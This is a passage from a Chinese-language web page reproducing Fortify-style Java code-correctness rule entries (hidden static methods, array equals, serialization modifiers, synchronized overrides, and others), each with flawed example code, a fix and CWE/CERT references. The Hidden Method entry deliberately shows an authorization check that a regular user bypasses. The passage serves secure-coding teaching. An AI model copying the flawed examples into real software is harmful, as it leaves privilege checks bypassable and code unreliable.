class="line"></span><br><span class="line">      logger.info(&quot;miracle&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>当 == 和 != 标记符被用来比较相同对象中包含的字符串时，它们只会按照预期的那样运行。要出现这种情况，最常用的方法就是将字符串内置，这样一来，就可以将字符串添加到一个由 String 类维护的对象池中。一旦字符串内置，在使用该字符串时，都会采用相同的对象，相等运算符也会按照预期的那样执行。所有字符串文字和带值的字符串常量都会自动内置。其他字符串可以通过调用 String.intern() 来手动内置，并会返回一个规范的当前字符串实例，必要时也会创建一个实例。</p>
<h5 id="RECOMMENDATIONS-56"><a href="#RECOMMENDATIONS-56" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>采用 equals() 方法比较字符串。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (STRING_CONSTANT.equals(args[0])) &#123;</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;could happen&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-53"><a href="#REFERENCES-53" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 597</p>
<h4 id="Code-Correctness-Erroneous-Zero-Value"><a href="#Code-Correctness-Erroneous-Zero-Value" class="headerlink" title="Code Correctness: Erroneous Zero Value"></a>Code Correctness: Erroneous Zero Value</h4><h5 id="ABSTRACT-55"><a href="#ABSTRACT-55" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>一个变量被错误地分配了零值。</p>
<h5 id="EXPLANATION-56"><a href="#EXPLANATION-56" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>此字段被标注为 FortifyNonZero，表示不允许使用零值。</p>
<h5 id="RECOMMENDATIONS-57"><a href="#RECOMMENDATIONS-57" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>确保无法将零值分配给带注释的字段。</p>
<h5 id="REFERENCES-54"><a href="#REFERENCES-54" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 20</p>
<p>[2] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 020</p>
<h4 id="Code-Correctness-Hidden-Method"><a href="#Code-Correctness-Hidden-Method" class="headerlink" title="Code Correctness: Hidden Method"></a>Code Correctness: Hidden Method</h4><h5 id="ABSTRACT-56"><a href="#ABSTRACT-56" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>无法对静态方法进行覆盖，但是在将其作为实例方法进行调用时，可以显示为隐藏状态。</p>
<h5 id="EXPLANATION-57"><a href="#EXPLANATION-57" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>静态方法无法根据定义进行覆盖，因为它们属于类，而非类的实例。但是，某些情况下，静态方法看似已在子类中被覆盖，这样会产生混淆并导致调用错误版本的方法。</p>
<p>示例 1：以下示例尝试定义 API 以对用户进行身份验证。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">class AccessLevel&#123;</span><br><span class="line"></span><br><span class="line">  public static final int ROOT = 0;</span><br><span class="line"></span><br><span class="line">  //...</span><br><span class="line"></span><br><span class="line">  public static final int NONE = 9;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//...</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line"></span><br><span class="line">  private static int access;</span><br><span class="line"></span><br><span class="line">  public User()&#123;</span><br><span class="line"></span><br><span class="line">    access = AccessLevel.ROOT;</span><br><span class="line"></span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  public static int getAccessLevel()&#123;</span><br><span class="line"></span><br><span class="line">    return access;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class RegularUser extends User &#123;</span><br><span class="line"></span><br><span class="line">  private static int access;</span><br><span class="line"></span><br><span class="line">  public RegularUser()&#123;</span><br><span class="line"></span><br><span class="line">    access = AccessLevel.NONE;</span><br><span class="line"></span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  public static int getAccessLevel()&#123;</span><br><span class="line"></span><br><span class="line">    return access;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static void escalatePrivilege()&#123;</span><br><span class="line"></span><br><span class="line">    access = AccessLevel.ROOT;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//...</span><br><span class="line"></span><br><span class="line">class SecureArea &#123;</span><br><span class="line"></span><br><span class="line">  //...</span><br><span class="line"></span><br><span class="line">  public static void doRestrictedOperation(User user)&#123;</span><br><span class="line"></span><br><span class="line">    if (user instanceof RegularUser)&#123;</span><br><span class="line"></span><br><span class="line">      if (user.getAccessLevel() == AccessLevel.ROOT)&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;doing a privileged operation&quot;);</span><br><span class="line"></span><br><span class="line">      &#125;else&#123;</span><br><span class="line"></span><br><span class="line">        throw new RuntimeException();</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此代码看上去还是比较合规。但是，由于我们是针对 user 实例，而非 User 或 RegularUser 类来调用 getAccessLevel() 方法，这意味着此条件下将始终返回 true 且会执行该限制操作，即使使用了 instanceof 以便进入 if/else 块的此部分也是如此。</p>
<h5 id="RECOMMENDATIONS-58"><a href="#RECOMMENDATIONS-58" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果可能，为静态方法分配的签名应尽量有别于超类中的签名，以避免产生混淆。理想情况下，应尽量将该代码修改得更明确一些，例如，将这些方法放入单独的 final 类中（不会为这些类创建子类），或者创建构造函数 private，以防止针对类的实例而非类来调用静态方法。</p>
<p>示例 2：以下示例对代码进行了修改，以显示更明确的权限，并使用最小特权准则来确保出现故障时的安全性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">class AccessLevel&#123;</span><br><span class="line"></span><br><span class="line">  public static final int ROOT = 0;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  public static final int NONE = 9;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line"></span><br><span class="line">  protected int access;</span><br><span class="line"></span><br><span class="line">  public User()&#123;</span><br><span class="line"></span><br><span class="line">    access = AccessLevel.NONE;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public int getAccessLevel()&#123;</span><br><span class="line"></span><br><span class="line">    return access;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">final class RegularUser extends User &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">final class AdminUser extends User &#123;</span><br><span class="line"></span><br><span class="line">  public AdminUser()&#123;</span><br><span class="line"></span><br><span class="line">    access = AccessLevel.ROOT;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">class SecureArea &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  public void doRestrictedOperation(User user) throws PermissionNotAllowedException &#123;</span><br><span class="line"></span><br><span class="line">    if (user.getAccessLevel() == AccessLevel.ROOT)&#123;</span><br><span class="line"></span><br><span class="line">      //do operation</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">      throw new PermissionNotAllowedException();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-55"><a href="#REFERENCES-55" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] MET07-J. Never declare a class method that hides a method declared in a superclass or superinterface CERT</p>
<p>[2] Java Language Specification Chapter 8. Classes Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 486</p>
<h4 id="Code-Correctness-Incorrect-serialPersistentFields-Modifier"><a href="#Code-Correctness-Incorrect-serialPersistentFields-Modifier" class="headerlink" title="Code Correctness: Incorrect serialPersistentFields Modifier"></a>Code Correctness: Incorrect serialPersistentFields Modifier</h4><h5 id="ABSTRACT-57"><a href="#ABSTRACT-57" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>要正确使用 serialPersistentFields，必须将其声明为 private、static 和 final。</p>
<h5 id="EXPLANATION-58"><a href="#EXPLANATION-58" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Java 对象序列化规范 (Java Object Serialization Specification) 允许开发人员通过在 serialPersistentFields 数组中指定类的可序列化的字段来手动定义这些字段。仅当 serialPersistentFields 被声明为 private、static 和 final 时，此功能才能运行。</p>
<p>例 1：将不会使用 serialPersistentFields 的下列声明来定义 Serializable 字段，因为它不是 private、static 和 final。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class List implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">public ObjectStreamField[] serialPersistentFields = &#123; new ObjectStreamField(&quot;myField&quot;, List.class) &#125;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-59"><a href="#RECOMMENDATIONS-59" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>当您使用 serialPersistentFields 来指定 Serializable 字段时，请确保其已声明为 private、static 和 final。</p>
<p>例 2：下列代码将 serialPersistentFields 正确地声明为 private、static 和 final。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class List implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">private static final ObjectStreamField[] serialPersistentFields = &#123; new ObjectStreamField(&quot;myField&quot;, List.class) &#125;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-56"><a href="#REFERENCES-56" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java Sun Tutorial</p>
<p>[2] SERIAL-2: Guard sensitive data during serialization Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 485</p>
<h4 id="Code-Correctness-Invalid-Call-to-Object-equals"><a href="#Code-Correctness-Invalid-Call-to-Object-equals" class="headerlink" title="Code Correctness: Invalid Call to Object.equals()"></a>Code Correctness: Invalid Call to Object.equals()</h4><h5 id="ABSTRACT-58"><a href="#ABSTRACT-58" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序会调用数组上的 Object.equals()，而非 java.util.Arrays.equals().</p>
<h5 id="EXPLANATION-59"><a href="#EXPLANATION-59" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>由于调用数组上的 Object.equals() 会检查数组地址是否相同而非检查数组元素是否相同，因此在大多数情况下这是一个错误调用，通常应将该代码替换为 java.util.Arrays.equals()。</p>
<p>示例 1：以下示例尝试使用 Object.equals() 函数检查两个数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">  int[] arr1 = new int[10];</span><br><span class="line"></span><br><span class="line">  int[] arr2 = new int[10];</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  if (arr1.equals(arr2))&#123;</span><br><span class="line"></span><br><span class="line">    //treat arrays as if identical elements</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>除非在某个点将一个数组分配至另一个数组，否则可能会始终生成一个从未执行的代码。</p>
<h5 id="RECOMMENDATIONS-60"><a href="#RECOMMENDATIONS-60" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用数组的 Object.equals() 可验证两个数组对象是否指向相同的地址，但这种用例很少。如果要尝试验证两个数组包含相同元素且其元素顺序相同，应使用 java.util.Arrays.equals()。</p>
<p>示例 2：以下示例使用 java.util.Arrays.equals() 修复示例 1 的问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import java.util.Arrays;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  int[] arr1 = new int[10];</span><br><span class="line"></span><br><span class="line">  int[] arr2 = new int[10];</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  if (Arrays.equals(arr1, arr2))&#123;</span><br><span class="line"></span><br><span class="line">    //treat arrays as if identical elements</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-57"><a href="#REFERENCES-57" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] EXP02-J. Do not use the Object.equals() method to compare two arrays CERT</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 398, CWE ID 754</p>
<p>[3] Standards Mapping - SANS Top 25 2010 Risky Resource Management - CWE ID 754</p>
<h4 id="Code-Correctness-Misleading-Method-Signature"><a href="#Code-Correctness-Misleading-Method-Signature" class="headerlink" title="Code Correctness: Misleading Method Signature"></a>Code Correctness: Misleading Method Signature</h4><h5 id="ABSTRACT-59"><a href="#ABSTRACT-59" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>这看上去好像能替代通用的 Java 方法，但实际上并不能达到预想的效果。</p>
<h5 id="EXPLANATION-60"><a href="#EXPLANATION-60" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>尽管该方法的名称与通用的 Java 方法相似，但它要么存在拼写错误，要么是参数列表导致其无法替代预期的方法。</p>
<p>例 1：以下方法的目的是重写 Object.equals()：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object obj1, Object obj2) &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是由于 Object.equals() 只需要一个参数，因此并不会调用以上的方法。</p>
<h5 id="RECOMMENDATIONS-61"><a href="#RECOMMENDATIONS-61" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>仔细检查确保该方法能够正常运行。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object obj) &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-58"><a href="#REFERENCES-58" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<h4 id="Code-Correctness-Non-Static-Inner-Class-Implements-Serializable"><a href="#Code-Correctness-Non-Static-Inner-Class-Implements-Serializable" class="headerlink" title="Code Correctness: Non-Static Inner Class Implements Serializable"></a>Code Correctness: Non-Static Inner Class Implements Serializable</h4><h5 id="ABSTRACT-60"><a href="#ABSTRACT-60" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>实施 java.io.Serializable 的内部类可能会导致问题以及泄露外部类中的信息。</p>
<h5 id="EXPLANATION-61"><a href="#EXPLANATION-61" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>对内部类进行序列化会导致对外部类也执行序列化，因此，如果外部类是不可序列化的，则可能会造成信息泄露或出现运行时错误。此外，由于 Java 编译器创建了合成字段以便实施内部类，因此对内部类执行序列化会导致出现平台依赖，但是依据不同的实施方法和不同的编译器，出现的情况也会有所不同。</p>
<p>示例 1：以下代码允许对内部类执行序列化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">class User implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">  private int accessLevel;</span><br><span class="line"></span><br><span class="line">  class Registrator implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在以上示例中，对内部类 Registrator 执行序列化后，也会对外部类 User 的 accessLevel 字段执行序列化。</p>
<h5 id="RECOMMENDATIONS-62"><a href="#RECOMMENDATIONS-62" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在使用内部类时，不应对其进行序列化，否则它们将变为静态嵌套类，由此就不会出现对非静态内部类执行序列化时会出现的问题。如果嵌套类为静态类型，则其本质上与实例变量并无关联（包括外部类的实例变量），并且不会导致对外部类执行序列化。</p>
<p>示例 2：以下代码通过阻止内部类实施 java.io.Serializable 更改了示例 1 中的示例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">class User implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">  private int accessLevel;</span><br><span class="line"></span><br><span class="line">  class Registrator &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示例 2：以下代码通过将内部类转变为静态嵌套类更改了示例 1 中的示例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">class User implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">  private int accessLevel;</span><br><span class="line"></span><br><span class="line">  static class Registrator implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-59"><a href="#REFERENCES-59" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] SER05-J. Do not serialize instances of inner classes CERT</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<h4 id="Code-Correctness-Non-Synchronized-Method-Overrides-Synchronized-Method"><a href="#Code-Correctness-Non-Synchronized-Method-Overrides-Synchronized-Method" class="headerlink" title="Code Correctness: Non-Synchronized Method Overrides Synchronized Method"></a>Code Correctness: Non-Synchronized Method Overrides Synchronized Method</h4><h5 id="ABSTRACT-61"><a href="#ABSTRACT-61" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>不应使用非同步方法覆盖同步方法。</p>
<h5 id="EXPLANATION-62"><a href="#EXPLANATION-62" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>父类声明方法 synchronized，以保证当多个线程访问相同实例时的正确行为。应将所有重写方法声明为 synchronized，否则可能会发生意外行为。</p>
<p>例 1：在下列代码中，类 Foo 覆盖类 Bar，但未将方法 synchronizedMethod 声明为 synchronized：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class Bar &#123;</span><br><span class="line"></span><br><span class="line">public synchronized void synchronizedMethod() &#123;</span><br><span class="line"></span><br><span class="line">    for (int i=0; i&lt;10; i++) System.out.print(i);</span><br><span class="line"></span><br><span class="line">    System.out.println();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public class Foo extends Bar &#123;</span><br><span class="line"></span><br><span class="line">public void synchronizedMethod() &#123;</span><br><span class="line"></span><br><span class="line">    for (int i=0; i&lt;10; i++) System.out.print(i);</span><br><span class="line"></span><br><span class="line">    System.out.println();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种情况下，Foo 实例会被转换为 Bar 类型。如果将相同的实例交给两个独立线程，并重复执行 synchronizedMethod，则行为将不可预知。</p>
<h5 id="RECOMMENDATIONS-63"><a href="#RECOMMENDATIONS-63" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果父方法为 synchronized，则必须将该方法声明为 synchronized。</p>
<h5 id="REFERENCES-60"><a href="#REFERENCES-60" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Bug ID: 4294756 Javac should warn if synchronized method is overridden with a non synchronized</p>
<p>[2] TSM00-J. Do not override thread-safe methods with methods that are not thread-safe CERT</p>
<h4 id="Code-Correctness-String-Comparison-of-Float"><a href="#Code-Correctness-String-Comparison-of-Float" class="headerlink" title="Code Correctness: String Comparison of Float"></a>Code Correctness: String Comparison of Float</h4><h5 id="ABSTRACT-62"><a href="#ABSTRACT-62" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将浮点值与 String 对象进行比较是一种不可靠的方式，应予以避免。</p>
<h5 id="EXPLANATION-63"><a href="#EXPLANATION-63" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果要将浮点值与 String 对象进行比较，则必须先将该值更改为 String 对象，通常是通过如 Double.toString() 等函数来实现。在将浮点变量转换为 String 对象后，其可能为 “NaN”、“Infinity” 或 “-Infinity”，或者带有几位小数点（其中包含 0），或者可能包含指数字段，具体取决于浮点变量的类型和数值。如果转换为十六进制字符串，则其形式也会有很大差异。</p>
<p>示例 1：以下示例将浮点值与 String 进行了比较。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">int initialNum = 1;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">String resultString = Double.valueOf(initialNum/10000.0).toString();</span><br><span class="line"></span><br><span class="line">if (s.equals(&quot;0.0001&quot;))&#123;</span><br><span class="line"></span><br><span class="line">  //do something</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
